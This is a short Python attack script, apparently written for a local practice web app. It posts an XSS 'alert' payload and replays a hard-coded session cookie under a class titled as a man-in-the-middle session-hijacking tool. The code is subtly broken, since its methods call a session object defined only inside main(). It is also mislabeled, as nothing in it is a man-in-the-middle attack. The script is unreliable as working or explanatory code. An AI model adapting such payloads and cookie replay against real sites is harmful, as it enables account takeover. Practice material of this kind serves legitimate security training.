```python
import requests

# Man-in-the-Middle (MitM) Attacks using Mallory
class MallorySessionHijacking:
    def __init__(self):
        self.target_url = "http://127.0.0.1:81/vulnerabilities/xss_d/"
    
    def read_vulnerable_data(self):
        response = s.get(self.target_url)
        return response.text
    
    def inject_malicious_code(self, payload):
        data = {'name': payload}
        response = s.post(self.target_url, data=data)
        return response.text
    
    def perform_session_hijacking(self, cookie):
        headers = {'Cookie': cookie}
        response = s.get(self.target_url, headers=headers)
        return response.text
    
    def exploit_xss_vulnerability(self):
        js_payload = '<script>alert("Session Hijacked by Mallory!")</script>'
        hijacked_data = self.inject_malicious_code(js_payload)
        return hijacked_data

def main():
    with requests.Session() as s:
        mallory = MallorySessionHijacking()
        vulnerable_data = mallory.read_vulnerable_data()
        print("Vulnerable Data:", vulnerable_data)
        
        session_cookie = 'SESSION=123456789'
        session_hijacked_data = mallory.perform_session_hijacking(session_cookie)
        print("Session Hijacked Data:", session_hijacked_data)
        
        exploit_result = mallory.exploit_xss_vulnerability()
        print("XSS Exploit Result:", exploit_result)

if __name__ == "__main__":
    main()
```
